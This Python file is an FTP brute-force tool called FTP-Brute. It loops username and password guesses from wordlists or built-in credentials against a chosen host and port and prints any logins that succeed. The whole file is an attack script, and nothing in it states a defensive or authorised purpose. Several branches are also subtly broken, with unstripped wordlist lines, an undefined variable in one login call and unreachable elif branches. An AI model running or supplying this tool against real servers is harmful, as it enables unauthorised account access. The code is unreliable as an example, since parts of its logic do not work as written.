import ftplib
import argparse
from colorama import Fore, Style
import sys

version = "v1.2.7"

logo = r"""
    ________________        ____             __     
   / ____/_  __/ __ \      / __ )_______  __/ /____ 
  / /_    / / / /_/ /_____/ __  / ___/ / / / __/ _ \
 / __/   / / / ____/_____/ /_/ / /  / /_/ / /_/  __/
/_/     /_/ /_/         /_____/_/   \__,_/\__/\___/ 
                                                    
"""

ftpserver = ftplib.FTP()

parser = argparse.ArgumentParser(prog='ftpBrute',
                                 description='Bruteforce FTP with wordlists or common built-in usernames/passwords',
                                 epilog=f'{version}')

parser.add_argument('--host', help='Specify the target FTP server hostname (e.g., `192.168.1.1`).', type=str, required=True)
parser.add_argument('--port', help='Specify the FTP port (default is `21`).', type=int, required=True)

parser.add_argument('-u', '--username', help='Provide a custom username for the brute-force attack.', type=str)
parser.add_argument('-p', '--password', help='Provide a custom password for the brute-force attack.', type=str)

parser.add_argument('-w', '--wordlist', help='Provide a wordlist file to attempt brute-forcing usernames (one per line).', type=str)

args = parser.parse_args()

if not args.host:
    parser.print_help()

wordlist = "wordlist.txt"

def bruteforce():
    try:
        print(f"{Fore.RED}{logo}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Starting FTP-Brute: {Style.RESET_ALL}[{Fore.RED}{args.host}{Style.RESET_ALL}:{Fore.RED}{args.port}{Style.RESET_ALL}]")
        if args.username and args.password:
            print(f"{Fore.YELLOW}Bruteforcing with custom credentials:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{args.password}]{Style.RESET_ALL}")
            try:
                ftpserver.connect(args.host, args.port)
                ftpserver.login(args.username, args.password)
                print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{args.password}]{Style.RESET_ALL}")
            except ftplib.all_errors as e:
                print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
        elif args.username:
            print(f"{Fore.YELLOW}Bruteforcing with custom credentials: {Fore.CYAN}[{args.username}]{Style.RESET_ALL}")
            with open(wordlist, 'r') as file:
                for pwd in file:
                    try:
                        ftpserver.connect(args.host, args.port)
                        ftpserver.login(args.username, pwd)
                        print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
                    except ftplib.all_errors as e:
                        print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
        elif args.password:
            print(f"{Fore.YELLOW}Bruteforcing with custom credentials: {Fore.CYAN} [{args.password}] {Style.RESET_ALL}")
            with open(wordlist, 'r') as file:
                for user in file:
                    try:
                        ftpserver.connect(args.host, args.port)
                        ftpserver.login(user, args.password)
                        print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
                    except ftplib.all_errors as e:
                        print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
        else:
            with open(wordlist, 'r') as file:
                credentials = [line.strip() for line in file]
            for user in credentials:
                for pwd in credentials:
                    print(f"{Fore.YELLOW}Bruteforcing with built-in credentials: {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                    try:
                        ftpserver.connect(args.host, args.port)
                        ftpserver.login(user, pwd)
                        print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                        break
                    except ftplib.all_errors as e:
                        print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
        if args.wordlist:
            try:
                with open(args.wordlist, 'r') as file:
                    for user in file:
                        for pwd in file:
                            print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                            try:
                                ftpserver.connect(args.host, args.port)
                                ftpserver.login(user, pwd)
                                print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL}")
                                break
                            except ftplib.all_errors as e:
                                print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
            except FileNotFoundError:
                print(f"Error: Wordlist file {args.wordlist} not found.")
            except Exception as e:
                print(f"Error: {Fore.MAGENTA}{e}{Style.RESET_ALL}")
        elif args.username and args.wordlist:
            try:
                with open(args.wordlist, 'r') as file:
                    for pwd in file:
                        print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
                        try:
                            ftpserver.connect(args.host, args.port)
                            ftpserver.login(args.username, pwd)
                            print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL}")
                            break
                        except ftplib.all_errors as e:
                            print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{args.username}:{pwd}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
            except FileNotFoundError:
                print(f"Error: Wordlist file {args.wordlist} not found.")
            except Exception as e:
                print(f"Error: {Fore.MAGENTA}{e}{Style.RESET_ALL}")
        elif args.password and args.wordlist:
            try:
                with open(args.wordlist, 'r') as file:
                    for user in file:
                        print(f"{Fore.YELLOW}Bruteforcing with wordlist: {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
                        try:
                            ftpserver.connect(args.host, args.port)
                            ftpserver.login(user, pwd)
                            print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL}")
                            break
                        except ftplib.all_errors as e:
                            print(f"{Fore.RED}Failed:{Style.RESET_ALL} {Fore.CYAN}[{user}:{args.password}]{Style.RESET_ALL} - {Fore.MAGENTA}{e}{Style.RESET_ALL}")
            except FileNotFoundError:
                print(f"Error: Wordlist file {args.wordlist} not found.")
            except Exception as e:
                print(f"Error: {Fore.MAGENTA}{e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"{Fore.RED}Bye!{Style.RESET_ALL}")
        sys.exit(0)  

bruteforce()
